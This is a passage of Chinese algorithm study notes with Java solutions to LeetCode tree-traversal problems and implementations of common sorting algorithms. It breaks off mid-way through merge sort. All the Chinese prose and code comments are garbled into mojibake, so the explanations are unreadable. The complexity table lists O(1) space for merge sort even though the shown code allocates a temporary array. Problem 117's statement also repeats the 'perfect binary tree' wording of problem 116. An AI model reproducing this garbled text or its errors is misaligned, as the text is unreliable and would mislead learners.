‘ï¼Œè¿”å›å…¶èŠ‚ç‚¹å€¼çš„*å±‚åºéå†*ã€‚ï¼ˆå³ä»å·¦åˆ°å³ï¼Œé€å±‚éå†ï¼‰ã€‚\n\næ ‘çš„åºåˆ—åŒ–è¾“å…¥æ˜¯ç”¨å±‚åºéå†ï¼Œæ¯ç»„å­èŠ‚ç‚¹éƒ½ç”± null å€¼åˆ†éš”ï¼ˆå‚è§ç¤ºä¾‹ï¼‰ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n<img src=\"https://assets.leetcode.com/uploads/2018/10/12/narytreeexample.png\" style=\"zoom:50%;\" />\n\n```\nè¾“å…¥ï¼šroot = [1,null,3,2,4,null,5,6]\nè¾“å‡ºï¼š[[1],[3,2,4],[5,6]]\n```\n\n**ç¤ºä¾‹ 2ï¼š**\n\n<img src=\"https://assets.leetcode.com/uploads/2019/11/08/sample_4_964.png\" style=\"zoom:60%;\" />\n\n```\nè¾“å…¥ï¼šroot = [1,null,2,3,4,5,null,null,6,7,null,8,null,9,10,null,null,11,null,12,null,13,null,null,14]\nè¾“å‡ºï¼š[[1],[2,3,4,5],[6,7,8,9,10],[11,12,13],[14]]\n```\n\n```java\nclass Solution {\n    public List<List<Integer>> levelOrder(Node root) {\n        List<List<Integer>> res = new ArrayList<>();\n        if(root == null) return res;\n        Queue<Node> queue = new LinkedList<>();\n        queue.offer(root);\n        while(!queue.isEmpty()){\n            int n = queue.size();\n            List<Integer> level = new ArrayList<>();\n            for(int i = 0; i < n; i++){\n                Node node = queue.poll();\n                level.add(node.val);\n                for(Node child : node.children){\n                    queue.offer(child);\n                }\n            }\n            res.add(level);\n        }\n        return res;  \n    }\n}\n```\n\n#### [515. åœ¨æ¯ä¸ªæ ‘è¡Œä¸­æ‰¾æœ€å¤§å€¼ ](https://leetcode.cn/problems/find-largest-value-in-each-tree-row/description/)\n\nç»™å®šä¸€æ£µäºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹ `root` ï¼Œè¯·æ‰¾å‡ºè¯¥äºŒå‰æ ‘ä¸­æ¯ä¸€å±‚çš„æœ€å¤§å€¼ã€‚\n\n**ç¤ºä¾‹1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2020/08/21/largest_e1.jpg)\n\n```properties\nè¾“å…¥: root = [1,3,2,5,3,null,9]\nè¾“å‡º: [1,3,9]\n```\n\n**ç¤ºä¾‹2ï¼š**\n\n```properties\nè¾“å…¥: root = [1,2,3]\nè¾“å‡º: [1,3]\n```\n\n------\n\n```java\nclass Solution {\n    public List<Integer> largestValues(TreeNode root) {\n        List<Integer> res = new ArrayList<>();\n        if(root ==null) return res;\n        Queue<TreeNode> queue = new LinkedList<>();\n        queue.offer(root);\n        while(!queue.isEmpty()){\n            int n = queue.size();\n            // è®°å½•è¿™ä¸€å±‚çš„æœ€å¤§å€¼\n            int levelMax = Integer.MIN_VALUE;\n            for(int i = 0; i < n; i++){\n                TreeNode cur = queue.poll();\n                levelMax = Math.max(levelMax, cur.val);\n                if (cur.left != null)\n                    queue.offer(cur.left);\n                if (cur.right != null)\n                    queue.offer(cur.right);\n            }\n            res.add(levelMax);\n        }\n        return res;\n    }\n}\n```\n\n#### [116. å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ](https://leetcode.cn/problems/populating-next-right-pointers-in-each-node/description/)\n\nç»™å®šä¸€ä¸ª **å®Œç¾äºŒå‰æ ‘** ï¼Œå…¶æ‰€æœ‰å¶å­èŠ‚ç‚¹éƒ½åœ¨åŒä¸€å±‚ï¼Œæ¯ä¸ªçˆ¶èŠ‚ç‚¹éƒ½æœ‰ä¸¤ä¸ªå­èŠ‚ç‚¹ã€‚äºŒå‰æ ‘å®šä¹‰å¦‚ä¸‹ï¼š\n\n```java\nstruct Node {\n  int val;\n  Node *left;\n  Node *right;\n  Node *next;\n}\n```\n\nå¡«å……å®ƒçš„æ¯ä¸ª next æŒ‡é’ˆï¼Œè®©è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘å…¶ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ã€‚å¦‚æœæ‰¾ä¸åˆ°ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ï¼Œåˆ™å°† next æŒ‡é’ˆè®¾ç½®ä¸º `NULL`ã€‚åˆå§‹çŠ¶æ€ä¸‹ï¼Œæ‰€æœ‰ next æŒ‡é’ˆéƒ½è¢«è®¾ç½®ä¸º `NULL`ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2019/02/14/116_sample.png)\n\n```properties\nè¾“å…¥ï¼šroot = [1,2,3,4,5,6,7]\nè¾“å‡ºï¼š[1,#,2,3,#,4,5,6,7,#]\nè§£é‡Šï¼šç»™å®šäºŒå‰æ ‘å¦‚å›¾ A æ‰€ç¤ºï¼Œä½ çš„å‡½æ•°åº”è¯¥å¡«å……å®ƒçš„æ¯ä¸ª next æŒ‡é’ˆï¼Œä»¥æŒ‡å‘å…¶ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ï¼Œå¦‚å›¾ B æ‰€ç¤ºã€‚åºåˆ—åŒ–çš„è¾“å‡ºæŒ‰å±‚åºéå†æ’åˆ—ï¼ŒåŒä¸€å±‚èŠ‚ç‚¹ç”± next æŒ‡é’ˆè¿æ¥ï¼Œ'#' æ ‡å¿—ç€æ¯ä¸€å±‚çš„ç»“æŸã€‚\n\n```\n\n**ç¤ºä¾‹ 2:**\n\n```properties\nè¾“å…¥ï¼šroot = []\nè¾“å‡ºï¼š[]\n```\n\n**è¿›é˜¶ï¼š**\n\n-   ä½ åªèƒ½ä½¿ç”¨å¸¸é‡çº§é¢å¤–ç©ºé—´ã€‚\n-   ä½¿ç”¨é€’å½’è§£é¢˜ä¹Ÿç¬¦åˆè¦æ±‚ï¼Œæœ¬é¢˜ä¸­é€’å½’ç¨‹åºå ç”¨çš„æ ˆç©ºé—´ä¸ç®—åšé¢å¤–çš„ç©ºé—´å¤æ‚åº¦ã€‚\n\n**æ–¹æ³•ä¸€ï¼šå±‚åºéå†**\n\n```java\n// æ—¶é—´å¤æ‚åº¦ï¼šO(N)\n// ç©ºé—´å¤æ‚åº¦ï¼šO(N)\nclass Solution {\n    public Node connect(Node root) {\n        if(root == null){\n            return root;\n        }\n        Queue<Node> queue = new LinkedList<>();\n        queue.offer(root);\n        while(!queue.isEmpty()){\n            int n = queue.size();\n            for(int i = 0; i < n; i++){\n                Node node = queue.poll();\n                if(i < n - 1){ //æœ€åä¸€ä¸ªèŠ‚ç‚¹ä¸ç”¨è®¾ç½®\n                    node.next = queue.peek(); //å…³é”®ä»£ç \n                }\n                if(node.left != null) queue.offer(node.left);\n                if(node.right != null) queue.offer(node.right);\n            }\n        }\n        return root;\n    }\n}\n\n\n```\n\n**æ–¹æ³•äºŒï¼šä½¿ç”¨å·²å»ºç«‹çš„** **next** **æŒ‡é’ˆ**\n\nä¸€æ£µæ ‘ä¸­ï¼Œå­˜åœ¨ä¸¤ç§ç±»å‹çš„ next æŒ‡é’ˆã€‚\n\nç¬¬ä¸€ç§æƒ…å†µæ˜¯è¿æ¥åŒä¸€ä¸ªçˆ¶èŠ‚ç‚¹çš„ä¸¤ä¸ªå­èŠ‚ç‚¹ã€‚å¯ä»¥é€šè¿‡åŒä¸€ä¸ªèŠ‚ç‚¹ç›´æ¥è®¿é—®åˆ°ï¼Œæ‰§è¡Œä¸‹é¢æ“ä½œå³å¯å®Œæˆè¿æ¥ã€‚\n\n<img src=\"https://assets.leetcode-cn.com/solution-static/116/1.png\" style=\"zoom:33%;\" />\n\n```java\nnode.left.next = node.right\n```\n\nç¬¬äºŒç§æƒ…å†µåœ¨ä¸åŒçˆ¶äº²çš„å­èŠ‚ç‚¹ä¹‹é—´å»ºç«‹è¿æ¥ï¼Œè¿™ç§æƒ…å†µä¸èƒ½ç›´æ¥è¿æ¥ã€‚å¦‚æœæˆ‘ä»¬èƒ½å°†è¿™ä¸€å±‚çš„ä¸Šä¸€å±‚ä¸²è”å¥½ã€‚é‚£ä¹ˆå¯ä»¥é€šè¿‡çˆ¶èŠ‚ç‚¹çš„`next`æ‰¾åˆ°é‚»å±…ï¼Œå®Œæˆä¸²è”ã€‚\n\n<img src=\"https://assets.leetcode-cn.com/solution-static/116/2.png\" style=\"zoom: 33%;\" />\n\n```java\nroot.right.next == root.next.left\n```\n\n```java\n// æ—¶é—´å¤æ‚åº¦ï¼šO(N)\n// ç©ºé—´å¤æ‚åº¦ï¼šO(1)\nclass Solution {\n    public Node connect(Node root) {\n        if (root == null) {\n            return root;\n        }\n        // ä»æ ¹èŠ‚ç‚¹å¼€å§‹\n        Node leftmost = root;\n        while (leftmost.left != null) {\n            // éå†è¿™ä¸€å±‚èŠ‚ç‚¹ç»„æˆçš„é“¾è¡¨ï¼Œä¸ºä¸‹ä¸€å±‚çš„èŠ‚ç‚¹æ›´æ–° next æŒ‡é’ˆ\n            Node head = leftmost;\n            while (head != null) {\n                // CONNECTION 1\n                head.left.next = head.right;\n                // CONNECTION 2\n                if (head.next != null) {\n                    head.right.next = head.next.left;\n                }\n                // æŒ‡é’ˆå‘åç§»åŠ¨\n                head = head.next;\n            }\n            // å»ä¸‹ä¸€å±‚çš„æœ€å·¦çš„èŠ‚ç‚¹\n            leftmost = leftmost.left;\n        }\n        return root;\n    }\n}\n```\n\n#### [117. å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ II](https://leetcode.cn/problems/populating-next-right-pointers-in-each-node-ii/description/)\n\nç»™å®šä¸€ä¸ª **å®Œç¾äºŒå‰æ ‘** ï¼Œå…¶æ‰€æœ‰å¶å­èŠ‚ç‚¹éƒ½åœ¨åŒä¸€å±‚ï¼Œæ¯ä¸ªçˆ¶èŠ‚ç‚¹éƒ½æœ‰ä¸¤ä¸ªå­èŠ‚ç‚¹ã€‚äºŒå‰æ ‘å®šä¹‰å¦‚ä¸‹ï¼š\n\n```\nstruct Node {\n  int val;\n  Node *left;\n  Node *right;\n  Node *next;\n}\n```\n\nå¡«å……å®ƒçš„æ¯ä¸ª next æŒ‡é’ˆï¼Œè®©è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘å…¶ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ã€‚å¦‚æœæ‰¾ä¸åˆ°ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ï¼Œåˆ™å°† next æŒ‡é’ˆè®¾ç½®ä¸º `NULL`ã€‚\n\nåˆå§‹çŠ¶æ€ä¸‹ï¼Œæ‰€æœ‰ next æŒ‡é’ˆéƒ½è¢«è®¾ç½®ä¸º `NULL`ã€‚\n\n**ç¤ºä¾‹ 1ï¼š**\n\n![](https://assets.leetcode.com/uploads/2019/02/14/116_sample.png)\n\n```\nè¾“å…¥ï¼šroot = [1,2,3,4,5,6,7]\nè¾“å‡ºï¼š[1,#,2,3,#,4,5,6,7,#]\nè§£é‡Šï¼šç»™å®šäºŒå‰æ ‘å¦‚å›¾ A æ‰€ç¤ºï¼Œä½ çš„å‡½æ•°åº”è¯¥å¡«å……å®ƒçš„æ¯ä¸ª next æŒ‡é’ˆï¼Œä»¥æŒ‡å‘å…¶ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ï¼Œå¦‚å›¾ B æ‰€ç¤ºã€‚åºåˆ—åŒ–çš„è¾“å‡ºæŒ‰å±‚åºéå†æ’åˆ—ï¼ŒåŒä¸€å±‚èŠ‚ç‚¹ç”± next æŒ‡é’ˆè¿æ¥ï¼Œ'#' æ ‡å¿—ç€æ¯ä¸€å±‚çš„ç»“æŸã€‚\n```\n\n**ç¤ºä¾‹ 2:**\n\n```\nè¾“å…¥ï¼šroot = []\nè¾“å‡ºï¼š[]\n```\n\n**æ–¹æ³•1ï¼šå±‚åºéå†**\n\n```java\nclass Solution {\n    public Node connect(Node root) {\n        if(root == null){\n            return root;\n        }\n        Queue<Node> queue = new LinkedList<>();\n        queue.offer(root);\n        while(!queue.isEmpty()){\n            int n = queue.size();\n            for(int i = 0; i < n; i++){\n                Node node = queue.poll();\n                if(i < n - 1){ //æœ€åä¸€ä¸ªèŠ‚ç‚¹ä¸ç”¨è®¾ç½®\n                    node.next = queue.peek(); //å…³é”®ä»£ç \n                }\n                if(node.left != null) queue.offer(node.left);\n                if(node.right != null) queue.offer(node.right);\n            }\n        }\n        return root;\n    }\n}\n```\n\n**æ–¹æ³•äºŒï¼šä½¿ç”¨å·²å»ºç«‹çš„** **next** **æŒ‡é’ˆ**\n\n```java\ncur.left.next = cur.right;\ncur.right.next = cur.next.left;\n```\n\nã€‚ã€‚ã€‚\n\n\n\n# äºŒã€ç®—æ³•\n\n## â‘ æ’åº\n\n### â“¿ å¤æ‚åº¦\n\n| æ’åºç®—æ³• | å¹³å‡æ—¶é—´         | æœ€å·®æ—¶é—´                | ç¨³å®šæ€§ | ç©ºé—´    | å¤‡æ³¨                     |\n| -------- | ---------------- | ----------------------- | ------ | ------- | ------------------------ |\n| å†’æ³¡æ’åº | O(n<sup>2</sup>) | O(n<sup>2</sup>)        | ç¨³å®š   | O(1)    | nè¾ƒå°æ—¶å¥½                |\n| é€‰æ‹©æ’åº | O(n<sup>2</sup>) | O(n<sup>2</sup>)        | ä¸ç¨³å®š | O(1)    | nè¾ƒå°æ—¶å¥½                |\n| æ’å…¥æ’åº | O(n<sup>2</sup>) | O(n<sup>2</sup>)        | ç¨³å®š   | O(1)    | å¤§éƒ¨åˆ†å·²æœ‰åºæ—¶å¥½         |\n| å¸Œå°”æ’åº | O(nlogn)         | O(n<sup>s</sup>)(1<s<2) | ä¸ç¨³å®š | O(1)    | sæ˜¯æ‰€é€‰åˆ†ç»„              |\n| å¿«é€Ÿæ’åº | O(nlogn)         | O(n<sup>2</sup>)        | ä¸ç¨³å®š | O(logn) | nè¾ƒå¤§æ—¶å¥½                |\n| å½’å¹¶æ’åº | O(nlogn)         | O(nlogn)                | ç¨³å®š   | O(1)    | nè¾ƒå¤§æ—¶å¥½                |\n| åŸºæ•°æ’åº | O(n*k)           | O(n*k)                  | ç¨³å®š   | O(n)    | nä¸ºæ•°æ®ä¸ªæ•°ï¼Œkä¸ºæ•°æ®ä½æ•° |\n| å †æ’åº   | O(nlogn)         | O(nlogn)                | ä¸ç¨³å®š | O(1)    | nè¾ƒå¤§æ—¶å¥½                |\n\n### â¶å†’æ³¡æ’åº\n\n**ç®—æ³•æ­¥éª¤**\n\n- æ¯”è¾ƒç›¸é‚»çš„å…ƒç´ ã€‚å¦‚æœç¬¬ä¸€ä¸ªæ¯”ç¬¬äºŒä¸ªå¤§ï¼Œå°±äº¤æ¢ä»–ä»¬ä¸¤ä¸ªã€‚\n- å¯¹æ¯ä¸€å¯¹ç›¸é‚»å…ƒç´ ä½œåŒæ ·çš„å·¥ä½œã€‚è¿™æ­¥åšå®Œåï¼Œ**æœ€åçš„å…ƒç´ ä¼šæ˜¯æœ€å¤§çš„æ•°**ã€‚\n- é’ˆå¯¹æ‰€æœ‰çš„å…ƒç´ é‡å¤ä»¥ä¸Šçš„æ­¥éª¤ï¼Œ**é™¤äº†æœ€åä¸€ä¸ª**ã€‚\n- æŒç»­æ¯æ¬¡å¯¹è¶Šæ¥è¶Šå°‘çš„å…ƒç´ é‡å¤ä¸Šé¢çš„æ­¥éª¤ï¼Œç›´åˆ°æ²¡æœ‰ä»»ä½•ä¸€å¯¹æ•°å­—éœ€è¦æ¯”è¾ƒã€‚\n- ä¸€å…±è¿›è¡Œäº† `æ•°ç»„å…ƒç´ ä¸ªæ•°-1` æ¬¡å¤§å¾ªç¯ï¼Œå°å¾ªç¯è¦æ¯”è¾ƒçš„å…ƒç´ è¶Šæ¥è¶Šå°‘ã€‚\n- ä¼˜åŒ–ï¼šå¦‚æœåœ¨æŸæ¬¡å¤§å¾ªç¯ï¼Œå‘ç°æ²¡æœ‰å‘ç”Ÿäº¤æ¢ï¼Œåˆ™è¯æ˜å·²ç»æœ‰åºã€‚\n\n```java\npublic class BubbleSort {\n    public static void main(String[] args) {\n        int[] arr = {4, 5, 1, 6, 2};\n        int[] res = bubbleSort(arr);\n        System.out.println(Arrays.toString(res));\n    }\n\n    public static int[] bubbleSort(int[] arr) {\n        for (int i = 1; i < arr.length; i++) {\n            boolean flag = true;  //å®šä¹‰ä¸€ä¸ªæ ‡è¯†ï¼Œæ¥è®°å½•è¿™è¶Ÿå¤§å¾ªç¯æ˜¯å¦å‘ç”Ÿäº†äº¤æ¢\n            for (int j = 0; j < arr.length - i; j++) {\n                if (arr[j] > arr[j + 1]) {\n                    int temp = arr[j];\n                    arr[j] = arr[j + 1];\n                    arr[j + 1] = temp;\n                    flag = false;\n                }\n            }\n            //å¦‚æœè¿™æ¬¡å¾ªç¯æ²¡å‘ç”Ÿäº¤æ¢ï¼Œç›´æ¥åœæ­¢å¾ªç¯\n            if (flag){\n                break;\n            }\n        }\n        return arr;\n    }\n}\n```\n\n### â·é€‰æ‹©æ’åº\n\n**ç®—æ³•æ­¥éª¤**\n\n- éå†æ•´ä¸ªæ•°ç»„ï¼Œæ‰¾åˆ°æœ€å°ï¼ˆå¤§ï¼‰çš„å…ƒç´ ï¼Œæ”¾åˆ°æ•°ç»„çš„èµ·å§‹ä½ç½®ã€‚\n- å†éå†å‰©ä¸‹çš„æ•°ç»„ï¼Œæ‰¾åˆ°å‰©ä¸‹å…ƒç´ ä¸­çš„æœ€å°ï¼ˆå¤§ï¼‰å…ƒç´ ï¼Œæ”¾åˆ°æ•°ç»„çš„ç¬¬äºŒä¸ªä½ç½®ã€‚\n- é‡å¤ä»¥ä¸Šæ­¥éª¤ï¼Œç›´åˆ°æ’åºå®Œæˆã€‚\n- ä¸€å…±éœ€è¦éå† `æ•°ç»„å…ƒç´ ä¸ªæ•°-1` æ¬¡ï¼Œå½“æ‰¾åˆ°ç¬¬äºŒå¤§ï¼ˆå°ï¼‰çš„å…ƒç´ æ—¶ï¼Œå¯ä»¥åœæ­¢ã€‚è¿™æ—¶æœ€åä¸€ä¸ªå…ƒç´ å¿…æ˜¯æœ€å¤§ï¼ˆå°ï¼‰å…ƒç´ ã€‚\n\n```java\npublic class SelectSort {\n    public static void main(String[] args) {\n        int[] arr = {3, 1, 6, 10, 2};\n        int[] res = selectSort(arr);\n        System.out.println(Arrays.toString(res));\n    }\n\n    public static int[] selectSort(int[] arr) {\n        for (int i = 0; i < arr.length - 1; i++) {\n            int min = i;\n            for (int j = i + 1; j < arr.length; j++) {\n                if(arr[min] > arr[j]){\n                    min = j;\n                }\n            }\n            // å°†æ‰¾åˆ°çš„æœ€å°å€¼å’Œiä½ç½®æ‰€åœ¨çš„å€¼è¿›è¡Œäº¤æ¢\n            int temp = arr[i];\n            arr[i] = arr[min];\n            arr[min] = temp;\n        }\n        return arr;\n    }\n}\n```\n\n### â¸æ’å…¥æ’åº\n\n**ç®—æ³•æ­¥éª¤**\n\n- å°†å¾…æ’åºåºåˆ—ç¬¬ä¸€ä¸ªå…ƒç´ çœ‹åšä¸€ä¸ª**æœ‰åºåºåˆ—**ï¼ŒæŠŠç¬¬äºŒä¸ªå…ƒç´ åˆ°æœ€åä¸€ä¸ªå…ƒç´ å½“æˆæ˜¯**æœªæ’åºåºåˆ—**ã€‚\n- ä»å¤´åˆ°å°¾ä¾æ¬¡æ‰«ææœªæ’åºåºåˆ—ï¼Œå°†æ‰«æåˆ°çš„æ¯ä¸ªå…ƒç´ æ’å…¥æœ‰åºåºåˆ—çš„é€‚å½“ä½ç½®ã€‚ï¼ˆå¦‚æœå¾…æ’å…¥çš„å…ƒç´ ä¸æœ‰åºåºåˆ—ä¸­çš„æŸä¸ªå…ƒç´ ç›¸ç­‰ï¼Œåˆ™å°†å¾…æ’å…¥å…ƒç´ æ’å…¥åˆ°ç›¸ç­‰å…ƒç´ çš„åé¢ã€‚\n\n```java\npublic class InsertSort {\n    public static void main(String[] args) {\n        int[] arr = {3, 1, 6, 10, 2};\n        int[] res = insertSort(arr);\n        System.out.println(Arrays.toString(res));\n    }\n\n    public static int[] insertSort(int[] arr) {\n        //ä»æ•°ç»„çš„ç¬¬äºŒä¸ªå…ƒç´ å¼€å§‹é€‰æ‹©åˆé€‚çš„ä½ç½®æ’å…¥\n        for (int i = 1; i < arr.length; i++) {\n            //è®°å½•è¦æ’å…¥çš„æ•°æ®,åé¢ç§»åŠ¨å…ƒç´ å¯èƒ½ä¼šè¦†ç›–è¯¥ä½ç½®ä¸Šå…ƒç´ çš„å€¼\n            int temp = arr[i];\n            //ä»å·²ç»æ’åºçš„åºåˆ—æœ€å³è¾¹å¼€å§‹æ¯”è¾ƒï¼Œæ‰¾åˆ°æ¯”å…¶å°çš„æ•°\n            //å˜é‡jç”¨äºéå†å‰é¢çš„æœ‰åºæ•°ç»„\n            int j = i;\n            while (j > 0 && temp < arr[j - 1]) {\n                //å¦‚æœæœ‰åºæ•°ç»„ä¸­çš„å…ƒç´ å¤§äºtempï¼Œåˆ™åç§»ä¸€ä¸ªä½ç½®\n                arr[j] = arr[j - 1];\n                j--;\n            }\n            //jæ‰€æŒ‡ä½ç½®å°±æ˜¯å¾…æ’å…¥çš„ä½ç½®\n            if (j != i) {\n                arr[j] = temp;\n            }\n        }\n        return arr;\n    }\n}\n```\n\n### â¹å¸Œå°”æ’åº\n\n**æ’å…¥æ’åºå­˜åœ¨çš„é—®é¢˜**\n\nå½“æœ€åä¸€ä¸ªå…ƒç´ ä¸ºæ•´ä¸ªæ•°ç»„çš„æœ€å°å…ƒç´ æ—¶ï¼Œéœ€è¦å°†å‰é¢çš„æœ‰åºæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½å‘åç§»ä¸€ä½ï¼Œè¿™æ ·æ˜¯éå¸¸èŠ±æ—¶é—´çš„ã€‚æ‰€ä»¥æœ‰äº†å¸Œå°”æ’åºæ¥å¸®æˆ‘ä»¬å°†æ•°ç»„ä»æ— åºå˜ä¸ºæ•´ä½“æœ‰åºå†å˜ä¸ºæœ‰åºã€‚\n\n**ç®—æ³•æ­¥éª¤**\n\n- é€‰æ‹©ä¸€ä¸ªå¢é‡åºåˆ— t1ï¼ˆä¸€èˆ¬æ˜¯æ•°ç»„é•¿åº¦/2ï¼‰ï¼Œt2ï¼ˆä¸€èˆ¬æ˜¯ä¸€ä¸ªåˆ†ç»„é•¿åº¦/2ï¼‰ï¼Œâ€¦â€¦ï¼Œtkï¼Œ**å…¶ä¸­ ti > tj**, tk = 1ï¼›\n- æŒ‰å¢é‡åºåˆ—ä¸ªæ•° kï¼Œå¯¹åºåˆ—è¿›è¡Œ k è¶Ÿæ’åºï¼›\n- æ¯è¶Ÿæ’åºï¼Œæ ¹æ®å¯¹åº”çš„å¢é‡ tiï¼Œå°†å¾…æ’åºåˆ—åˆ†å‰²æˆè‹¥å¹²é•¿åº¦ä¸º m çš„å­åºåˆ—ï¼Œåˆ†åˆ«å¯¹å„å­è¡¨è¿›è¡Œç›´æ¥æ’å…¥æ’åºã€‚å½“å¢é‡å› å­ä¸º 1 æ—¶ï¼Œæ•´ä¸ªåºåˆ—ä½œä¸ºä¸€ä¸ªè¡¨æ¥å¤„ç†ï¼Œè¡¨é•¿åº¦å³ä¸ºæ•´ä¸ªåºåˆ—çš„é•¿åº¦ã€‚\n\n<img src=\"../images/æ•°æ®ç»“æ„ä¸ç®—æ³•/20200621122846.png\" style=\"zoom:50%;\" />\n\n```java\npublic class ShellSort {\n    public static void main(String[] args) {\n        int[] arr = {3, 6, 1, 4, 5, 8, 2, 0};\n        int[] res = shellSort(arr);\n        System.out.println(Arrays.toString(res));\n    }\n\n    public static int[] shellSort(int[] arr) {\n        //å°†æ•°ç»„åˆ†ä¸ºgapç»„,æ¯ä¸ªç»„å†…éƒ¨è¿›è¡Œæ’å…¥æ’åº\n        for (int gap = arr.length / 2; gap > 0; gap /= 2) {\n            //iç”¨æ¥æŒ‡å‘æœªæ’åºæ•°ç»„çš„é¦–ä¸ªå…ƒç´ \n            for (int i = gap; i < arr.length; i++) {\n                int temp = arr[i];\n                int j = i;\n                while (j - gap >= 0 && temp < arr[j - gap]) {\n                    arr[j] = arr[j - gap];\n                    j -= gap;\n                }\n                arr[j] = temp;\n            }\n        }\n        return arr;\n    }\n}\n```\n\n### âºå¿«é€Ÿæ’åº\n\n**ç®—æ³•æ­¥éª¤**\n\n- ä»æ•°ç»„ä¸­æŒ‘å‡ºä¸€ä¸ªå…ƒç´ ï¼Œç§°ä¸º â€œåŸºå‡†â€ï¼ˆpivotï¼‰;\n- é‡æ–°æ’åºæ•°ç»„ï¼›\n  - æ¯”åŸºå‡†å€¼å°çš„å…ƒç´ æ‘†æ”¾åœ¨åŸºå‡†å‰é¢\n  - æ¯”åŸºå‡†å€¼å¤§çš„æ‘†åœ¨åŸºå‡†çš„åé¢\n  - ç›¸åŒçš„æ•°å¯ä»¥åˆ°ä»»ä¸€è¾¹\n- æ’åºå¥½åï¼Œè¯¥åŸºå‡†å°±å¤„äºæ•°åˆ—çš„ä¸­é—´ä½ç½®ã€‚è¿™ä¸ªç§°ä¸ºåˆ†åŒºï¼ˆpartitionï¼‰æ“ä½œï¼›\n- ç„¶åé€’å½’åœ°ï¼ˆrecursiveï¼‰æŠŠå°äºåŸºå‡†å€¼çš„å­æ•°ç»„å’Œå¤§äºåŸºå‡†å€¼å…ƒç´ çš„å­æ•°ç»„å†æ’åºã€‚\n\n```java\npublic class QuickSort {\n    public static void main(String[] args) {\n        int[] arr = {8, 12, 19, -1, 45, 0, 14, 4, 11};\n        quickSort(arr, 0, arr.length - 1);\n        System.out.println(Arrays.toString(arr));\n    }\n\n    public static void quickSort(int[] arr, int left, int right) {\n        //é€’å½’ç»ˆæ­¢æ¡ä»¶\n        if (left > right) return;\n        //å®šä¹‰æ•°ç»„ç¬¬ä¸€ä¸ªæ•°ä¸ºåŸºå‡†å€¼\n        int pivot = arr[left];\n        //å®šä¹‰ä¸¤ä¸ªå“¨å…µ\n        int i = left;\n        int j = right;\n\n        while (i != j) {\n            //ä»å³å¾€å·¦æ‰¾æ¯”åŸºå‡†å€¼å°çš„æ•°\n            while (pivot <= arr[j] && i < j) j--;\n            //ä»å·¦å¾€å³æ‰¾æ¯”åŸºå‡†å€¼å¤§çš„æ•°\n            while (pivot >= arr[i] && i < j) i++;\n            if (i < j) { //å¦‚æœi<jï¼Œäº¤æ¢å®ƒä»¬\n                int temp = arr[i];\n                arr[i] = arr[j];\n                arr[j] = temp;\n            }\n        }\n        //æŠŠåŸºå‡†å€¼æ”¾åˆ°åˆé€‚çš„ä½ç½®\n        arr[left] = arr[i];\n        arr[i] = pivot;\n        quickSort(arr, left, i - 1);//å¯¹å·¦è¾¹çš„å­æ•°ç»„è¿›è¡Œå¿«é€Ÿæ’åº\n        quickSort(arr, i + 1, right);//å¯¹å³è¾¹çš„å­æ•°ç»„è¿›è¡Œå¿«é€Ÿæ’åº\n    }\n}\n```\n\nå‚è€ƒï¼š[å¿«é€Ÿæ’åºæ³•ï¼ˆè¯¦è§£ï¼‰](https://blog.csdn.net/qq_40941722/article/details/94396010)\n\n### â»å½’å¹¶æ’åº\n\n> å½’å¹¶æ’åºï¼ˆMerge sortï¼‰æ˜¯å»ºç«‹åœ¨å½’å¹¶æ“ä½œä¸Šçš„ä¸€ç§æœ‰æ•ˆçš„æ’åºç®—æ³•ã€‚è¯¥ç®—æ³•æ˜¯é‡‡ç”¨**åˆ†æ²»æ³•**ï¼ˆDivide and Conquerï¼‰çš„ä¸€ä¸ªéå¸¸å…¸å‹çš„åº”ç”¨ã€‚\n\nç®—æ³•æ­¥éª¤\n\n1. ç”³è¯·ç©ºé—´ï¼Œè¯¥ç©ºé—´ç”¨æ¥å­˜æ”¾åˆå¹¶åçš„åºåˆ—ï¼›\n2. è®¾å®šä¸¤ä¸ªæŒ‡é’ˆï¼Œæœ€åˆä½ç½®åˆ†åˆ«ä¸ºä¸¤ä¸ªå·²ç»æ’åºåºåˆ—çš„èµ·å§‹ä½ç½®ï¼›\n3. æ¯”è¾ƒä¸¤ä¸ªæŒ‡é’ˆæ‰€æŒ‡å‘çš„å…ƒç´ ï¼Œé€‰æ‹©ç›¸å¯¹å°çš„å…ƒç´ æ”¾å…¥åˆ°åˆå¹¶ç©ºé—´ï¼Œå¹¶ç§»åŠ¨æŒ‡é’ˆåˆ°ä¸‹ä¸€ä½ç½®ï¼›\n4. é‡å¤æ­¥éª¤ 3 ç›´åˆ°æŸä¸€æŒ‡é’ˆè¾¾åˆ°åºåˆ—å°¾ï¼›\n5. å°†åºåˆ—å‰©ä¸‹çš„æ‰€æœ‰å…ƒç´ ç›´æ¥å¤åˆ¶åˆ°åˆå¹¶åºåˆ—å°¾ã€‚\n\n![åˆ†æ²»æ³•](https://img.jwt1399.top/img/202210101308107.png)\n\næ²»ç†é˜¶æ®µ\n\n| ![](https://img.jwt1399.top/img/202210101307305.png) | ![](https://img.jwt1399.top/img/202210101307861.png) |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n\n```java\npublic class MergeSort {\n    public static void main(String[] args) {\n        int[] arr = {8, 4, 5, 7, 1, 3, 6, 2};\n        int[] tmp = new int[arr.length];\n        mergeSort(arr, 0, arr.length - 1, tmp);\n        System.out.println(Arrays.toString(arr));\n    }\n\n    //åˆ†+æ²»\n    public static void mergeSort(int[] arr, int left, int right, int[] tmp) {\n\n        if (left < right) {\n            int mid = (left + right) / 2;//ä¸­é—´ç´¢å¼•\n            